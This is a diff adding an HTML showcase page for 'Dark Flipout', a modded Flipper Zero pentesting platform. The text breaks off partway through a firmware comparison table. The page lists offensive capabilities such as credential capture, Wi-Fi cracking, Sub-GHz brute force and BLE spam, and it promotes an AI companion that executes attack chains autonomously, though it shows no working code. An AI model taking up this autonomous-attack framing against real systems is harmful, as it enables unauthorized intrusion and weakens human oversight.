@@ -1,0 +1,2563 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🖤 DARK FLIPOUT — Ultimate Flipper Zero Mod</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+        :root {
+            --black: #000000;
+            --dark: #080808;
+            --darker: #040404;
+            --red: #ff0033;
+            --red-dim: #cc0028;
+            --red-glow: #ff003366;
+            --cyan: #00ffcc;
+            --cyan-dim: #00cc99;
+            --cyan-glow: #00ffcc33;
+            --white: #f0f0f0;
+            --gray: #333333;
+            --gray-light: #555555;
+            --green: #00ff41;
+            --yellow: #ffcc00;
+            --purple: #9900ff;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: var(--black);
+            color: var(--white);
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 16px;
+            overflow-x: hidden;
+            cursor: crosshair;
+        }
+
+        /* SCANLINE OVERLAY */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                transparent,
+                transparent 2px,
+                rgba(0,0,0,0.08) 2px,
+                rgba(0,0,0,0.08) 4px
+            );
+            pointer-events: none;
+            z-index: 9998;
+        }
+
+        /* GLITCH ANIMATION */
+        @keyframes glitch {
+            0%, 90%, 100% { transform: translate(0); filter: none; }
+            92% { transform: translate(-3px, 1px); filter: hue-rotate(90deg); }
+            94% { transform: translate(3px, -1px); filter: hue-rotate(-90deg); }
+            96% { transform: translate(-2px, 2px); filter: brightness(2); }
+        }
+
+        @keyframes flicker {
+            0%, 95%, 100% { opacity: 1; }
+            96% { opacity: 0.4; }
+            98% { opacity: 0.9; }
+        }
+
+        @keyframes pulse-red {
+            0%, 100% { box-shadow: 0 0 10px var(--red-glow), inset 0 0 10px rgba(255,0,51,0.05); }
+            50% { box-shadow: 0 0 30px var(--red-glow), inset 0 0 20px rgba(255,0,51,0.1); }
+        }
+
+        @keyframes pulse-cyan {
+            0%, 100% { box-shadow: 0 0 10px var(--cyan-glow); }
+            50% { box-shadow: 0 0 30px var(--cyan-glow), 0 0 60px var(--cyan-glow); }
+        }
+
+        @keyframes scan-line {
+            0% { top: -5%; }
+            100% { top: 105%; }
+        }
+
+        @keyframes type-cursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes spin-slow {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes bar-fill {
+            from { width: 0; }
+            to { width: var(--target-width); }
+        }
+
+        /* HEADER */
+        .header {
+            position: relative;
+            text-align: center;
+            padding: 60px 20px 40px;
+            background: linear-gradient(180deg, rgba(255,0,51,0.08) 0%, transparent 100%);
+            border-bottom: 1px solid var(--red);
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 50%;
+            transform: translateX(-50%);
+            width: 100%; height: 1px;
+            background: linear-gradient(90deg, transparent, var(--red), transparent);
+        }
+
+        /* Scanning line effect */
+        .header::after {
+            content: '';
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--cyan), var(--red), transparent);
+            animation: scan-line 3s linear infinite;
+            opacity: 0.6;
+        }
+
+        .logo-subtitle {
+            font-family: 'Share Tech Mono', monospace;
+            color: var(--cyan);
+            font-size: 0.85rem;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            opacity: 0.8;
+        }
+
+        .logo-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(2.5rem, 7vw, 5.5rem);
+            font-weight: 900;
+            color: var(--white);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            animation: glitch 8s infinite, flicker 12s infinite;
+            text-shadow: 
+                0 0 20px rgba(255,0,51,0.8),
+                0 0 40px rgba(255,0,51,0.4),
+                3px 3px 0 rgba(0,255,204,0.3);
+        }
+
+        .logo-title span {
+            color: var(--red);
+        }
+
+        .logo-tagline {
+            font-family: 'Share Tech Mono', monospace;
+            color: var(--gray-light);
+            font-size: 0.9rem;
+            letter-spacing: 3px;
+            margin-top: 15px;
+        }
+
+        .logo-tagline .cursor {
+            animation: type-cursor 1s infinite;
+        }
+
+        .header-meta {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+
+        .header-badge {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.7rem;
+            padding: 4px 12px;
+            border: 1px solid var(--red);
+            color: var(--red);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        /* NAVIGATION */
+        .nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(0,0,0,0.95);
+            border-bottom: 1px solid var(--gray);
+            padding: 12px 20px;
+            display: flex;
+            gap: 5px;
+            overflow-x: auto;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav a {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--gray-light);
+            text-decoration: none;
+            padding: 6px 14px;
+            border: 1px solid transparent;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            transition: all 0.2s;
+            text-transform: uppercase;
+        }
+
+        .nav a:hover {
+            color: var(--cyan);
+            border-color: var(--cyan);
+            text-shadow: 0 0 10px var(--cyan);
+        }
+
+        /* MAIN CONTAINER */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        /* SECTION */
+        .section {
+            margin-bottom: 60px;
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--gray);
+        }
+
+        .section-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.7rem;
+            color: var(--red);
+            border: 1px solid var(--red);
+            padding: 4px 10px;
+            min-width: 50px;
+            text-align: center;
+        }
+
+        .section-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(1rem, 2.5vw, 1.4rem);
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .section-line {
+            flex: 1;
+            height: 1px;
+            background: linear-gradient(90deg, var(--red), transparent);
+        }
+
+        /* GRID LAYOUTS */
+        .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
+        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; }
+
+        /* CARDS */
+        .card {
+            background: var(--darker);
+            border: 1px solid var(--gray);
+            padding: 25px;
+            position: relative;
+            transition: all 0.3s;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 3px; height: 100%;
+            background: var(--red);
+        }
+
+        .card:hover {
+            border-color: var(--red);
+            animation: pulse-red 2s infinite;
+            transform: translateY(-2px);
+        }
+
+        .card.cyan::before { background: var(--cyan); }
+        .card.cyan:hover {
+            border-color: var(--cyan);
+            animation: pulse-cyan 2s infinite;
+        }
+
+        .card.green::before { background: var(--green); }
+        .card.yellow::before { background: var(--yellow); }
+        .card.purple::before { background: var(--purple); }
+
+        .card-icon {
+            font-size: 2rem;
+            margin-bottom: 12px;
+            animation: float 4s ease-in-out infinite;
+            display: inline-block;
+        }
+
+        .card-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--white);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+        }
+
+        .card-body {
+            font-size: 0.9rem;
+            color: #aaa;
+            line-height: 1.7;
+        }
+
+        .card-tag {
+            display: inline-block;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.65rem;
+            padding: 2px 8px;
+            margin: 3px 2px;
+            border: 1px solid var(--red);
+            color: var(--red);
+            letter-spacing: 1px;
+        }
+
+        .card-tag.cyan { border-color: var(--cyan); color: var(--cyan); }
+        .card-tag.green { border-color: var(--green); color: var(--green); }
+        .card-tag.yellow { border-color: var(--yellow); color: var(--yellow); }
+        .card-tag.purple { border-color: var(--purple); color: var(--purple); }
+
+        /* TERMINAL BLOCKS */
+        .terminal {
+            background: #050505;
+            border: 1px solid var(--gray);
+            border-left: 3px solid var(--green);
+            padding: 20px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.8;
+            overflow-x: auto;
+        }
+
+        .terminal .prompt { color: var(--green); }
+        .terminal .cmd { color: var(--cyan); }
+        .terminal .output { color: #888; }
+        .terminal .success { color: var(--green); }
+        .terminal .error { color: var(--red); }
+        .terminal .warn { color: var(--yellow); }
+        .terminal .highlight { color: var(--white); }
+
+        /* CAPABILITY BARS */
+        .capability-bar {
+            margin-bottom: 15px;
+        }
+
+        .capability-label {
+            display: flex;
+            justify-content: space-between;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+            color: #aaa;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+        }
+
+        .capability-label .pct { color: var(--cyan); }
+
+        .bar-track {
+            height: 6px;
+            background: var(--gray);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--red), var(--cyan));
+            animation: bar-fill 1.5s ease-out forwards;
+        }
+
+        /* HARDWARE TABLE */
+        .hw-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .hw-table th {
+            background: rgba(255,0,51,0.15);
+            color: var(--red);
+            padding: 10px 15px;
+            text-align: left;
+            letter-spacing: 2px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            border-bottom: 1px solid var(--red);
+        }
+
+        .hw-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: #aaa;
+            vertical-align: top;
+        }
+
+        .hw-table tr:hover td {
+            background: rgba(255,0,51,0.05);
+            color: var(--white);
+        }
+
+        .hw-table .price { color: var(--green); }
+        .hw-table .name { color: var(--white); }
+        .hw-table .status-active {
+            color: var(--green);
+        }
+        .hw-table .status-optional {
+            color: var(--yellow);
+        }
+
+        /* ARCHITECTURE DIAGRAM */
+        .arch-diagram {
+            background: var(--darker);
+            border: 1px solid var(--gray);
+            padding: 30px;
+            text-align: center;
+        }
+
+        .arch-layer {
+            border: 1px solid var(--gray);
+            padding: 20px;
+            margin: 10px 0;
+            position: relative;
+            transition: all 0.3s;
+        }
+
+        .arch-layer:hover {
+            border-color: var(--cyan);
+        }
+
+        .arch-layer-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            color: var(--cyan);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+        }
+
+        .arch-layer-items {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .arch-item {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.7rem;
+            padding: 4px 12px;
+            background: rgba(0,255,204,0.08);
+            border: 1px solid var(--cyan-dim);
+            color: var(--cyan);
+            letter-spacing: 1px;
+        }
+
+        .arch-connector {
+            font-size: 1.5rem;
+            color: var(--red);
+            text-align: center;
+            margin: 5px 0;
+        }
+
+        /* ATTACK MAP */
+        .attack-tree {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 2;
+            padding: 20px;
+            background: var(--darker);
+            border: 1px solid var(--gray);
+        }
+
+        .attack-domain { color: var(--red); font-weight: bold; font-size: 0.9rem; }
+        .attack-sub { color: var(--cyan); padding-left: 20px; }
+        .attack-item { color: #888; padding-left: 40px; }
+        .attack-item:hover { color: var(--white); cursor: default; }
+
+        /* ROADMAP */
+        .roadmap-item {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+            padding: 20px;
+            background: var(--darker);
+            border: 1px solid var(--gray);
+            border-left: 3px solid var(--red);
+            transition: all 0.3s;
+        }
+
+        .roadmap-item:hover {
+            border-color: var(--cyan);
+            border-left-color: var(--cyan);
+        }
+
+        .roadmap-sprint {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.7rem;
+            color: var(--red);
+            min-width: 80px;
+            padding-top: 3px;
+            letter-spacing: 1px;
+        }
+
+        .roadmap-content {}
+
+        .roadmap-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            color: var(--white);
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+        }
+
+        .roadmap-tasks {
+            color: #888;
+            font-size: 0.85rem;
+            line-height: 1.8;
+        }
+
+        .roadmap-tasks li {
+            list-style: none;
+            padding-left: 15px;
+            position: relative;
+        }
+
+        .roadmap-tasks li::before {
+            content: '▶';
+            position: absolute;
+            left: 0;
+            color: var(--red);
+            font-size: 0.6rem;
+            top: 4px;
+        }
+
+        /* AI SECTION */
+        .ai-scenario {
+            background: var(--darker);
+            border: 1px solid var(--gray);
+            border-left: 3px solid var(--purple);
+            padding: 20px;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+
+        .ai-scenario:hover {
+            border-color: var(--purple);
+            box-shadow: 0 0 20px rgba(153,0,255,0.2);
+        }
+
+        .ai-scenario-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            color: var(--purple);
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+        }
+
+        .ai-scenario-body {
+            font-size: 0.9rem;
+            color: #aaa;
+            line-height: 1.7;
+        }
+
+        .ai-step {
+            display: flex;
+            gap: 12px;
+            margin: 8px 0;
+            align-items: flex-start;
+        }
+
+        .ai-step-num {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--purple);
+            border: 1px solid var(--purple);
+            padding: 1px 6px;
+            min-width: 28px;
+            text-align: center;
+            margin-top: 2px;
+        }
+
+        .ai-step-text {
+            font-size: 0.85rem;
+            color: #999;
+            flex: 1;
+        }
+
+        /* STATS BAR */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 40px;
+        }
+
+        .stat-box {
+            background: var(--darker);
+            border: 1px solid var(--gray);
+            padding: 20px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .stat-box:hover {
+            border-color: var(--red);
+            box-shadow: 0 0 20px var(--red-glow);
+        }
+
+        .stat-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(1.5rem, 3vw, 2.2rem);
+            font-weight: 900;
+            color: var(--red);
+            text-shadow: 0 0 20px var(--red-glow);
+            display: block;
+        }
+
+        .stat-label {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.65rem;
+            color: #666;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+
+        /* FIRMWARE COMPARISON */
+        .fw-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .fw-table th {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.7rem;
+            padding: 12px 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-bottom: 2px solid var(--red);
+        }
+
+        .fw-table th:nth-child(3) { color: var(--cyan); border-bottom-color: var(--cyan); }
+        .fw-table th:nth-child(4) { color: var(--red); }
+        .fw-table th:nth-child(5) { color: #888; }
+        .fw-table th:nth-child(2) { color: #666; }
+        .fw-table th:first-child { color: #555; }
+
+        .fw-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.85rem;
+            color: #777;
+            text-align: center;
+        }
+
+        .fw-table td:first-child {
+            text-align: left;
+            color: #aaa;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.75rem;
+        }
+
+        .fw-check { color: var(--green); font-size: 1rem; }
+        .fw-cross { color: #333; font-size: 1rem; }
+        .fw-winner { color: var(--cyan); }
+
+        /* FOOTER */
+        .footer {
+            border-top: 1px solid var(--red);
+            padding: 30px 20px;
+            text-align: center;
+            background: rgba(255,0,51,0.03);
+        }
+
+        .footer-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.8rem;
+            color: var(--red);
+            letter-spacing: 4px;
+            margin-bottom: 10px;
+        }
+
+        .footer-text {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.7rem;
+            color: #444;
+            letter-spacing: 1px;
+            line-height: 1.8;
+        }
+
+        .footer-text a { color: var(--cyan); text-decoration: none; }
+
+        /* GLOW TEXT UTILITIES */
+        .glow-red { color: var(--red); text-shadow: 0 0 10px var(--red-glow); }
+        .glow-cyan { color: var(--cyan); text-shadow: 0 0 10px var(--cyan-glow); }
+        .glow-green { color: var(--green); text-shadow: 0 0 10px rgba(0,255,65,0.4); }
+
+        /* DIVIDER */
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--red), transparent);
+            margin: 40px 0;
+        }
+
+        /* SD LAYOUT */
+        .sd-tree {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 2;
+            background: #050505;
+            border: 1px solid var(--gray);
+            border-left: 3px solid var(--yellow);
+            padding: 20px;
+            overflow-x: auto;
+        }
+
+        .sd-root { color: var(--yellow); }
+        .sd-dir { color: var(--cyan); }
+        .sd-file { color: #888; }
+        .sd-file:hover { color: var(--white); cursor: default; }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .grid-2, .grid-3, .grid-4 { grid-template-columns: 1fr; }
+            .header-meta { gap: 10px; }
+            .nav { padding: 8px 10px; gap: 3px; }
+        }
+
+        /* SCROLLBAR */
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: var(--black); }
+        ::-webkit-scrollbar-thumb { background: var(--red); }
+        ::-webkit-scrollbar-thumb:hover { background: var(--cyan); }
+
+        /* HIGHLIGHT BOX */
+        .highlight-box {
+            background: rgba(255,0,51,0.05);
+            border: 1px solid var(--red);
+            border-left: 4px solid var(--red);
+            padding: 20px 25px;
+            margin: 20px 0;
+        }
+
+        .highlight-box.cyan {
+            background: rgba(0,255,204,0.05);
+            border-color: var(--cyan);
+            border-left-color: var(--cyan);
+        }
+
+        .highlight-box p {
+            font-size: 0.95rem;
+            color: #ccc;
+            line-height: 1.8;
+        }
+
+        /* COMPANION UI MOCK */
+        .companion-mock {
+            background: #020202;
+            border: 2px solid var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.8rem;
+            padding: 0;
+            box-shadow: 0 0 40px rgba(0,255,204,0.2);
+        }
+
+        .companion-titlebar {
+            background: rgba(0,255,204,0.1);
+            border-bottom: 1px solid var(--cyan);
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .companion-title {
+            color: var(--cyan);
+            font-size: 0.75rem;
+            letter-spacing: 3px;
+        }
+
+        .companion-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .companion-dot {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+        }
+
+        .companion-dot.red { background: var(--red); }
+        .companion-dot.yellow { background: var(--yellow); }
+        .companion-dot.green { background: var(--green); }
+
+        .companion-body {
+            padding: 20px;
+        }
+
+        .companion-line {
+            display: flex;
+            gap: 10px;
+            margin: 4px 0;
+        }
+
+        .companion-line .p { color: var(--green); }
+        .companion-line .c { color: var(--cyan); }
+        .companion-line .o { color: #666; }
+        .companion-line .h { color: var(--white); }
+        .companion-line .e { color: var(--red); }
+        .companion-line .w { color: var(--yellow); }
+
+        .companion-menu {
+            border: 1px solid var(--gray);
+            padding: 15px;
+            margin-top: 15px;
+        }
+
+        .companion-menu-item {
+            padding: 4px 0;
+            color: #777;
+            transition: color 0.2s;
+        }
+
+        .companion-menu-item:hover { color: var(--cyan); }
+        .companion-menu-item .num { color: var(--red); margin-right: 8px; }
+        .companion-menu-item.active { color: var(--green); }
+        .companion-menu-item.active .num { color: var(--green); }
+    </style>
+<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <div class="logo-subtitle">// PROJECT CODENAME //</div>
+    <div class="logo-title">DARK <span>FLIP</span>OUT</div>
+    <div class="logo-tagline">ULTIMATE FLIPPER ZERO CUSTOM MOD PROJECT<span class="cursor">_</span></div>
+    <div class="header-meta">
+        <span class="header-badge">// AUTHORIZED PENTESTING ONLY //</span>
+        <span class="header-badge">// APRIL 2026 //</span>
+        <span class="header-badge">// V1.0 //</span>
+        <span class="header-badge">// AI-AUTONOMOUS //</span>
+    </div>
+</div>
+
+<!-- NAV -->
+<nav class="nav">
+    <a href="#vision">VISION</a>
+    <a href="#stats">STATS</a>
+    <a href="#firmware">FIRMWARE</a>
+    <a href="#hardware">HARDWARE</a>
+    <a href="#capabilities">CAPABILITIES</a>
+    <a href="#ai">AI LAYER</a>
+    <a href="#scripts">SCRIPTS</a>
+    <a href="#companion">COMPANION</a>
+    <a href="#attackmap">ATTACK MAP</a>
+    <a href="#roadmap">ROADMAP</a>
+    <a href="#marauder">MARAUDER</a>
+    <a href="#attackflows">FLOWS</a>
+    <a href="#youtube">YOUTUBE</a>
+    <a href="#package">PACKAGE</a>
+</nav>
+
+<div class="container">
+
+    <!-- VISION -->
+    <section class="section" id="vision">
+        <div class="section-header">
+            <div class="section-number">01</div>
+            <div class="section-title">Project Vision</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="highlight-box">
+            <p>Dark Flipout is not a stock Flipper Zero. It is not even a modded Flipper Zero. It is a <span class="glow-red">fully autonomous, AI-assisted, multi-vector wireless penetration platform</span> that fits in your pocket. The goal is to push the Flipper Zero to its absolute theoretical limit — combining the best custom firmware, every relevant hardware expansion, a custom script framework, AI-driven autonomous operation, and deep integration with your existing 10k+ tool pentesting ecosystem.</p>
+        </div>
+
+        <div class="grid-3" style="margin-top: 25px;">
+            <div class="card">
+                <div class="card-icon">🔴</div>
+                <div class="card-title">Layer 1 — The Device</div>
+                <div class="card-body">Flipper Zero + Momentum firmware + Mayhem v2 expansion (WiFi/BT/Camera/NRF24/CC1101) + GPS + External Antenna. Every radio frequency within reach is weaponized.</div>
+            </div>
+            <div class="card cyan">
+                <div class="card-icon">🧠</div>
+                <div class="card-title">Layer 2 — The Brain</div>
+                <div class="card-body">V3SP3R AI companion via OpenRouter. Natural language control, voice commands, camera input, autonomous attack chain execution with risk-classified approval gates.</div>
+            </div>
+            <div class="card green">
+                <div class="card-icon">💻</div>
+                <div class="card-title">Layer 3 — The Mothership</div>
+                <div class="card-body">G17 ROG Strix + RTX 4060 running the Dark Flipout Companion. Serial bridge, PCAP ingestion, WPA2 cracking, AI attack planner, full 10k+ tool integration.</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- STATS -->
+    <section class="section" id="stats">
+        <div class="section-header">
+            <div class="section-number">02</div>
+            <div class="section-title">Capability Statistics</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="stats-row">
+            <div class="stat-box">
+                <span class="stat-number">7</span>
+                <span class="stat-label">Radio Protocols</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">50+</span>
+                <span class="stat-label">Attack Vectors</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">10k+</span>
+                <span class="stat-label">Tool Integrations</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">∞</span>
+                <span class="stat-label">IR Devices</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">AI</span>
+                <span class="stat-label">Autonomous Ops</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">300-928</span>
+                <span class="stat-label">MHz Sub-GHz</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">4060</span>
+                <span class="stat-label">GPU Hash Crack</span>
+            </div>
+            <div class="stat-box">
+                <span class="stat-number">0</span>
+                <span class="stat-label">USB for BadKB</span>
+            </div>
+        </div>
+
+        <!-- CAPABILITY BARS -->
+        <div class="grid-2">
+            <div class="card">
+                <div class="card-title">RF Attack Surface</div>
+                <div style="margin-top: 15px;">
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Sub-GHz (300-928MHz)</span><span class="pct">95%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 95%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>WiFi 802.11 (Marauder)</span><span class="pct">98%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 98%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Bluetooth BLE</span><span class="pct">90%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 90%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>NFC 13.56MHz</span><span class="pct">85%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 85%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>RFID 125kHz</span><span class="pct">92%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 92%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>NRF24 2.4GHz</span><span class="pct">80%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 80%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Infrared</span><span class="pct">100%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 100%;"></div></div>
+                    </div>
+                </div>
+            </div>
+            <div class="card cyan">
+                <div class="card-title">Attack Domain Coverage</div>
+                <div style="margin-top: 15px;">
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Physical Access Systems</span><span class="pct">90%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 90%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Wireless Networks</span><span class="pct">97%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 97%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>HID Injection</span><span class="pct">100%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 100%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Social Engineering</span><span class="pct">85%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 85%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Autonomous AI Ops</span><span class="pct">88%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 88%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Credential Capture</span><span class="pct">93%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 93%;"></div></div>
+                    </div>
+                    <div class="capability-bar">
+                        <div class="capability-label"><span>Automotive (CAN)</span><span class="pct">60%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="--target-width: 60%;"></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FIRMWARE -->
+    <section class="section" id="firmware">
+        <div class="section-header">
+            <div class="section-number">03</div>
+            <div class="section-title">Firmware Selection</div>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="highlight-box cyan">
+            <p>Dark Flipout runs <span class="glow-cyan">Momentum Firmware</span> — the direct successor to Xtreme (discontinued Nov 2024). Most feature-complete, most actively maintained, best tooling for red teaming in 2025-2026.</p>
+        </div>
+
+        <div style="overflow-x: auto; margin-top: 20px;">
+        <table class="fw-table">
+            <thead>
+                <tr>
+                    <th>Feature</th>
+                    <th>Official</th>
+                    <th>⭐ MOMENTUM</th>
+                    <th>Unleashed</th>
+                    <th>RogueMaster</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>Stability</td><td class="fw-check">✓</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-cross">~</td></tr>
+                <tr><td>Regional Sub-GHz Unlock</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-check">✓</td></tr>
+                <tr><td>Rolling Code Support</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-check">✓</td></tr>
+                <tr><td>BLE Spam</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-check">✓</td></tr>
+                <tr><td>BadKB (Bluetooth HID)</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-cross">✗</td></tr>
+                <tr><td>Sub-GHz Brute Force</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-check">✓</td><td class="fw-check">✓</td></tr>
+                <tr><td>GPS / Subdriving</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-cross">✗</td><td class="fw-cross">✗</td></tr>
+                <tr><td>Advanced Security</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-cross">✗</td><td class="fw-cross">✗</td></tr>
+                <tr><td>Interface Customization</td><td class="fw-cross">✗</td><td class="fw-winner fw-check">✓</td><td class="fw-cross">✗</td><td class="fw-check">✓</td></tr>
